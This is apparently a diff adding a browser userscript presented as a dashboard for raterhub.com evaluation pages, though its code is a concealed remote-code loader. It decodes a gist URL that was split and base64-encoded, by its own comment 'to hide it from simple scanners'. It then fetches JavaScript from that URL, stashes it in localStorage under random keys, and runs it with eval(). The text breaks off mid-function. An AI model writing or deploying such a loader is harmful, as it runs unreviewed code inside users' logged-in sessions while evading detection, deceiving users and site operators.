@@ -1,0 +1,116 @@
+// ==UserScript==
+// @name         Dashboard Raterhub F3
+// @namespace    http://tampermonkey.net/
+// @version      3.0
+// @description  Sample description
+// @author       Sahil Khan
+// @match        https://www.raterhub.com/evaluation/*
+// @grant        GM_xmlhttpRequest
+// @grant        GM_addStyle
+// @connect      gist.githubusercontent.com
+// ==/UserScript==
+
+(function() {
+    'use strict';
+
+    // The Gist URL is encoded in Base64 across three parts to hide it from simple scanners
+    const GIST_PARTS = [
+        "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9zYWhpaWxseC84NTYyZGNkN2Rl",
+        "OWU2NGM5MzY2MWEwMDEyZmRiMDIxYi9yYXcvYjg4MGZhN2NkOGVhOTBmZTMyZjM2ZGMz",
+        "MDUyMzlkNzJjMmJhNjllYy9ndWlkZUJ1dHRvbi5jb3JlLmpz"
+    ];
+    
+    const CHUNK_COUNT = 20; // Splits the code into 20 pieces
+    const MASTER_KEY = 'rhub_guidex';
+    const CACHE_LIFETIME = 8 * 60 * 60 * 1000; // 8 hours
+
+    // Decodes the hidden Gist URL
+    function getGistUrl() {
+        try {
+            return atob(GIST_PARTS.join(''));
+        } catch (e) {
+            console.error("Loader: Could not decode the Gist URL.", e);
+            return null;
+        }
+    }
+
+    // Splits the downloaded code into 20 pieces and saves them with random keys
+    function saveToFragmentedCache(data) {
+        try {
+            // Cleanup old cache first
+            const oldMaster = localStorage.getItem(MASTER_KEY);
+            if (oldMaster) {
+                JSON.parse(oldMaster).forEach(key => localStorage.removeItem(key));
+            }
+
+            const jsonString = JSON.stringify(data);
+            const encodedData = btoa(unescape(encodeURIComponent(jsonString)));
+            const chunkSize = Math.ceil(encodedData.length / CHUNK_COUNT);
+            const keyList = [];
+
+            for (let i = 0; i < CHUNK_COUNT; i++) {
+                // Generates a random-looking key name like "rhub_a1b2c3d4"
+                const randomKey = 'rhub_' + Math.random().toString(36).substring(2, 12);
+                keyList.push(randomKey);
+                
+                const chunk = encodedData.substring(i * chunkSize, (i + 1) * chunkSize) || '';
+                localStorage.setItem(randomKey, chunk);
+            }
+            // Save the list of keys so we can find the pieces later
+            localStorage.setItem(MASTER_KEY, JSON.stringify(keyList));
+        } catch (e) {
+            console.error("Loader: Failed to save obfuscated cache.", e);
+        }
+    }
+
+    // Reconstructs the code from the 20 hidden pieces
+    function loadFromFragmentedCache() {
+        try {
+            const masterData = localStorage.getItem(MASTER_KEY);
+            if (!masterData) return null;
+
+            const keyList = JSON.parse(masterData);
+            let combinedBase64 = '';
+
+            for (const key of keyList) {
+                const piece = localStorage.getItem(key);
+                if (piece === null) throw new Error("Cache part missing: " + key);
+                combinedBase64 += piece;
+            }
+
+            const decodedJson = decodeURIComponent(escape(atob(combinedBase64)));
+            return JSON.parse(decodedJson);
+        } catch (e) {
+            console.error('Loader: Failed to load obfuscated cache.', e);
+            return null;
+        }
+    }
+
+    function executeScript(code) {
+        console.log('Loader: Executing core logic...');
+        try {
+            eval(code);
+        } catch (err) {
+            console.error('Loader: Error executing the core script.', err);
+        }
+    }
+
+    function fetchAndCache(url) {
+        if (!url) return;
+        console.log('Loader: Fetching latest script from Gist...');
+        
+        GM_xmlhttpRequest({
+            method: 'GET',
+            url: url,
+            onload: function(res) {
+                if (res.status >= 200 && res.status < 300) {
+                    console.log('Loader: Successfully fetched new script.');
+                    const payload = {
+                        code: res.responseText,
+                        timestamp: Date.now(),
+                        url: url
+                    };
+                    saveToFragmentedCache(payload);
+                    executeScript(payload.code);
+                }
+            }
